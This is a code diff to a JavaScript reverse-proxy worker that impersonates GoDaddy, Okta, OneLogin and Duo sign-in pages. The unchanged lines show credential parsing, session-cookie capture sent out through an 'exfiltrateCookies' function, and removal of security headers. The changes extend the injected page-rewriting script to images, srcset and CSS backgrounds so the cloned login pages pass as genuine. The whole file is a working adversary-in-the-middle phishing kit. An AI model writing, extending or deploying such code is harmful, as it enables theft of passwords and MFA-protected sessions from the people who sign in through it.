@@ -197,7 +197,6 @@ function parseCredentials(bodyText) {
 
 // ==================== CLIENT-SIDE INTERCEPTOR SCRIPT ====================
 function generateInterceptorScript(upstreamDomain, currentPath) {
-  // Extract the base path from currentPath (e.g., /trust-center/)
   const pathWithoutQuery = currentPath.split('?')[0];
   const pathSegments = pathWithoutQuery.split('/').filter(Boolean);
   const baseSegment = pathSegments.length > 0 ? pathSegments[0] : '';
@@ -225,7 +224,8 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
         'sso.godaddy.com', 'sso.secureserver.net', 'api.godaddy.com',
         'okta.com', 'onelogin.com', 'duosecurity.com',
         'wsimg.com', 'img1.wsimg.com', 'img2.wsimg.com', 'img3.wsimg.com',
-        'img4.wsimg.com', 'img5.wsimg.com', 'img6.wsimg.com'
+        'img4.wsimg.com', 'img5.wsimg.com', 'img6.wsimg.com',
+        'gui.godaddy.com', 'www.godaddy.com'
       ];
       return domains.some(d => hostname.includes(d));
     }
@@ -233,16 +233,10 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
     function rewriteUrl(url) {
       if (!url || typeof url !== 'string') return url;
       try {
-        // Already proxied - skip
         if (url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;
-        
-        // Data URLs, blob URLs, javascript: - skip
         if (url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('javascript:')) return url;
-        
-        // Hash-only URLs - skip
         if (url.startsWith('#')) return url;
 
-        // Absolute URLs with http/https
         if (url.startsWith('http://') || url.startsWith('https://')) {
           try {
             const urlObj = new URL(url);
@@ -253,7 +247,6 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
           return url;
         }
 
-        // Protocol-relative URLs (//domain.com/...)
         if (url.startsWith('//')) {
           const hostname = url.split('/')[2];
           if (shouldProxyDomain(hostname)) {
@@ -262,13 +255,12 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
           return 'https:' + url;
         }
 
-        // Root-relative URLs starting with /
         if (url.startsWith('/')) {
           const cleanPath = url.substring(1);
+          if (cleanPath.startsWith('_p/')) return url;
           return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + '/' + cleanPath;
         }
 
-        // Path-relative URLs (not starting with /, http, or //)
         if (!url.startsWith('/') && !url.startsWith('http')) {
           const currentDir = CURRENT_BASE_PATH;
           return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + currentDir + url;
@@ -280,7 +272,54 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
       return url;
     }
 
-    // Override fetch
+    const originalImageSrc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
+    Object.defineProperty(HTMLImageElement.prototype, 'src', {
+      get: function() {
+        return originalImageSrc.get.call(this);
+      },
+      set: function(value) {
+        const newSrc = rewriteUrl(value);
+        if (newSrc !== value) {
+          console.log('[Proxy Interceptor] Rewrote Image.src:', value, '->', newSrc);
+        }
+        originalImageSrc.set.call(this, newSrc);
+      }
+    });
+
+    if ('srcset' in HTMLImageElement.prototype) {
+      const originalSrcset = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'srcset') 
+        || { get: function() { return this.getAttribute('srcset'); }, set: function(v) { this.setAttribute('srcset', v); }};
+      
+      Object.defineProperty(HTMLImageElement.prototype, 'srcset', {
+        get: function() { return originalSrcset.get.call(this); },
+        set: function(value) {
+          if (!value) {
+            originalSrcset.set.call(this, value);
+            return;
+          }
+          const urls = value.split(',').map(part => {
+            const trimmed = part.trim();
+            const spaceIdx = trimmed.search(/\\s/);
+            let url, descriptor;
+            if (spaceIdx === -1) {
+              url = trimmed;
+              descriptor = '';
+            } else {
+              url = trimmed.slice(0, spaceIdx);
+              descriptor = trimmed.slice(spaceIdx);
+            }
+            const newUrl = rewriteUrl(url);
+            return newUrl + descriptor;
+          });
+          const newValue = urls.join(', ');
+          if (newValue !== value) {
+            console.log('[Proxy Interceptor] Rewrote srcset:', value, '->', newValue);
+          }
+          originalSrcset.set.call(this, newValue);
+        }
+      });
+    }
+
     const originalFetch = window.fetch;
     window.fetch = function(url, options) {
       try {
@@ -303,7 +342,6 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
       }
     };
 
-    // Override XMLHttpRequest
     const originalOpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
       try {
@@ -317,7 +355,6 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
       }
     };
 
-    // Override WebSocket
     if (window.WebSocket) {
       const originalWebSocket = window.WebSocket;
       window.WebSocket = function(url, protocols) {
@@ -333,7 +370,6 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
       };
     }
 
-    // Silent service worker suppression
     if ('serviceWorker' in navigator) {
       const fakeRegistration = {
         active: null,
@@ -350,10 +386,27 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
       };
     }
 
-    // Monitor DOM changes
     if (typeof MutationObserver !== 'undefined') {
       const observer = new MutationObserver(function(mutations) {
         mutations.forEach(function(mutation) {
+          if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
+            const node = mutation.target;
+            if (node.style && node.style.backgroundImage) {
+              const current = node.style.backgroundImage;
+              const newBg = current.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
+                if (url.startsWith('http') || url.startsWith('/')) {
+                  const newUrl = rewriteUrl(url);
+                  if (newUrl !== url) return 'url(' + newUrl + ')';
+                }
+                return match;
+              });
+              if (newBg !== current) {
+                node.style.backgroundImage = newBg;
+                console.log('[Proxy Interceptor] Rewrote backgroundImage:', current, '->', newBg);
+              }
+            }
+          }
+          
           mutation.addedNodes.forEach(function(node) {
             if (node.nodeType === 1) {
               try {
@@ -364,6 +417,7 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
                     console.log('[Proxy Interceptor] Rewrote node src:', newSrc);
                   }
                 }
+                
                 if (node.href && !node.href.includes(YOUR_DOMAIN + PROXY_PREFIX) && !node.href.startsWith('#')) {
                   const newHref = rewriteUrl(node.href);
                   if (newHref !== node.href) {
@@ -371,8 +425,20 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
                     console.log('[Proxy Interceptor] Rewrote node href:', newHref);
                   }
                 }
+                
+                if (node.style && node.style.cssText) {
+                  const newCss = node.style.cssText.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
+                    const newUrl = rewriteUrl(url);
+                    if (newUrl !== url) return 'url(' + newUrl + ')';
+                    return match;
+                  });
+                  if (newCss !== node.style.cssText) {
+                    node.style.cssText = newCss;
+                  }
+                }
+
                 if (node.querySelectorAll) {
-                  node.querySelectorAll('[src],[href]').forEach(function(el) {
+                  node.querySelectorAll('[src],[href],[style]').forEach(function(el) {
                     if (el.src && !el.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
                       const newSrc = rewriteUrl(el.src);
                       if (newSrc !== el.src) el.src = newSrc;
@@ -380,6 +446,12 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
                     if (el.href && !el.href.includes(YOUR_DOMAIN + PROXY_PREFIX) && !el.href.startsWith('#')) {
                       const newHref = rewriteUrl(el.href);
                       if (newHref !== el.href) el.href = newHref;
+                    }
+                    if (el.style && el.style.cssText) {
+                      el.style.cssText = el.style.cssText.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
+                        const newUrl = rewriteUrl(url);
+                        return newUrl !== url ? 'url(' + newUrl + ')' : match;
+                      });
                     }
                   });
                 }
@@ -390,15 +462,37 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
       });
 
       if (document.body) {
-        observer.observe(document.body, { childList: true, subtree: true });
+        observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'src', 'href'] });
       } else {
         document.addEventListener('DOMContentLoaded', function() {
-          if (document.body) observer.observe(document.body, { childList: true, subtree: true });
+          if (document.body) observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'src', 'href'] });
         });
       }
     }
 
-    // Intercept form submissions
+    const originalSetProperty = CSSStyleDeclaration.prototype.setProperty;
+    CSSStyleDeclaration.prototype.setProperty = function(property, value, priority) {
+      if (property && property.toLowerCase().includes('background') && value && value.includes('url(')) {
+        value = value.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
+          const newUrl = rewriteUrl(url);
+          if (newUrl !== url) return 'url(' + newUrl + ')';
+          return match;
+        });
+      }
+      return originalSetProperty.call(this, property, value, priority);
+    };
+
+    if (CSSStyleSheet && CSSStyleSheet.prototype.insertRule) {
+      const originalInsertRule = CSSStyleSheet.prototype.insertRule;
+      CSSStyleSheet.prototype.insertRule = function(rule, index) {
+        const newRule = rule.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
+          const newUrl = rewriteUrl(url);
+          return newUrl !== url ? 'url(' + newUrl + ')' : match;
+        });
+        return originalInsertRule.call(this, newRule, index);
+      };
+    }
+
     document.addEventListener('submit', function(e) {
       const form = e.target;
       if (form.action && !form.action.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
@@ -438,7 +532,6 @@ export default async function handleRequest(request) {
 
   console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);
 
-  // Handle preflight requests
   if (request.method === 'OPTIONS') {
     return new Response(null, {
       status: 200,
@@ -452,17 +545,14 @@ export default async function handleRequest(request) {
     });
   }
 
-  // Build headers
   const headers = new Headers(request.headers);
   headers.set('Host', upstreamDomain);
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
 
-  // Remove problematic headers
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
 
-  // Handle POST request body
   let bodyText = null;
   let requestBodyForUpstream = null;
 
@@ -527,7 +617,6 @@ export default async function handleRequest(request) {
 
     console.log(`[DEBUG] Upstream response status: ${resp.status}`);
 
-    // Handle redirect
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
       const loc = resp.headers.get('Location');
       if (loc) {
@@ -541,7 +630,6 @@ export default async function handleRequest(request) {
       }
     }
 
-    // Process response
     const newHeaders = new Headers(resp.headers);
     newHeaders.set('access-control-allow-origin', '*');
     newHeaders.set('access-control-allow-credentials', 'true');
@@ -552,7 +640,6 @@ export default async function handleRequest(request) {
     newHeaders.delete('clear-site-data');
     newHeaders.delete('strict-transport-security');
 
-    // Handle cookies
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
     let shouldCaptureCookies = false;
     let cookieStr = '';
@@ -577,14 +664,11 @@ export default async function handleRequest(request) {
       await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
     }
 
-    // Rewrite body content
     const ct = resp.headers.get('content-type') || '';
 
-    // Process text-based content
     if (/text\/html|application\/javascript|application\/json|text\/javascript|text\/css/.test(ct)) {
       let text = await resp.text();
 
-      // HTML-specific processing
       if (ct.includes('text/html')) {
         const interceptor = generateInterceptorScript(upstreamDomain, info.path);
 
@@ -597,25 +681,38 @@ export default async function handleRequest(request) {
         }
       }
 
-      // Rewrite all absolute URLs for known domains
       Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
         const escaped = domain.replace(/\./g, '\\.');
         const regex = new RegExp('https?://' + escaped + '([^"\'`\\s)]*)', 'gi');
         text = text.replace(regex, 'https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$1');
       });
 
-      // Handle relative URLs in HTML content - PRODUCE ABSOLUTE URLS
       if (ct.includes('text/html')) {
-        // Match src="/..." and href="/..." - FIXED: Added https://YOUR_DOMAIN
+        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, (match, path) => {
+          if (path.startsWith('_p/') || path.startsWith('data:')) return match;
+          return 'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/' + path + ')';
+        });
+        
+        text = text.replace(/srcset=["']([^"']+)["']/gi, (match, srcset) => {
+          const urls = srcset.split(',').map(part => {
+            const [url, descriptor] = part.trim().split(/\s+/);
+            if (url && url.startsWith('/') && !url.startsWith('/_p/')) {
+              return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${url}${descriptor ? ' ' + descriptor : ''}`;
+            }
+            return part;
+          });
+          return `srcset="${urls.join(', ')}"`;
+        });
+      }
+
+      if (ct.includes('text/html')) {
         text = text.replace(/(src|href)="\/([^"]+)"/gi, (match, attr, path) => {
           if (path.startsWith('_p/') || path.startsWith('data:') || path.startsWith('blob:')) {
             return match;
           }
-          // CRITICAL FIX: Produce absolute URL with domain
           return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
         });
 
-        // Also handle single quotes - FIXED
         text = text.replace(/(src|href)='\/([^']+)'/gi, (match, attr, path) => {
           if (path.startsWith('_p/') || path.startsWith('data:') || path.startsWith('blob:')) {
             return match;
@@ -623,7 +720,6 @@ export default async function handleRequest(request) {
           return `${attr}='https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}'`;
         });
 
-        // Handle Next.js _next/static paths - FIXED TO ABSOLUTE URLS
         text = text.replace(/src="\/_next\/static\/([^"]+)"/gi, 
           `src="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/_next/static/$1"`);
         text = text.replace(/href="\/_next\/static\/([^"]+)"/gi, 
@@ -633,7 +729,6 @@ export default async function handleRequest(request) {
         text = text.replace(/href='\/_next\/static\/([^']+)'/gi, 
           `href='https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/_next/static/$1'`);
 
-        // Handle path-relative URLs - FIXED
         const currentDir = info.path.replace(/\/[^\/]*$/, '/');
         text = text.replace(/(src|href)="([^"]+)"/gi, (match, attr, path) => {
           if (path.startsWith('/') || path.startsWith('http') || path.startsWith('data:') || path.startsWith('blob:') || path.startsWith('#')) {
@@ -643,7 +738,6 @@ export default async function handleRequest(request) {
         });
       }
 
-      // Handle CSS url() references - FIXED
       text = text.replace(/url\(["']?(https?:\/\/[^"')]+)["']?\)/gi, (match, url) => {
         try {
           const urlObj = new URL(url);
@@ -654,12 +748,10 @@ export default async function handleRequest(request) {
         return match;
       });
 
-      // Handle relative URLs in CSS - FIXED TO ABSOLUTE URLS
       if (ct.includes('text/css')) {
         text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, 
           'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/$1)');
         
-        // Handle path-relative in CSS
         const cssCurrentDir = info.path.replace(/\/[^\/]*$/, '/');
         text = text.replace(/url\(["']?([^\/"')][^"')]*)["']?\)/gi, (match, path) => {
           if (path.startsWith('http') || path.startsWith('data:')) return match;
@@ -667,7 +759,6 @@ export default async function handleRequest(request) {
         });
       }
 
-      // Rewrite form actions in HTML - FIXED
       if (ct.includes('text/html')) {
         text = text.replace(/action=["'](https?:\/\/[^"']+)["']/gi, (match, url) => {
           try {
@@ -679,7 +770,6 @@ export default async function handleRequest(request) {
           return match;
         });
         
-        // Handle root-relative form actions - FIXED
         text = text.replace(/action="\/([^"]*)"/gi, 
           `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
         text = text.replace(/action='\/([^']*)'/gi, 
@@ -689,7 +779,6 @@ export default async function handleRequest(request) {
       return new Response(text, { status: resp.status, headers: newHeaders });
     }
 
-    // For binary/static content, just pass through
     return new Response(resp.body, { status: resp.status, headers: newHeaders });
 
   } catch (err) {
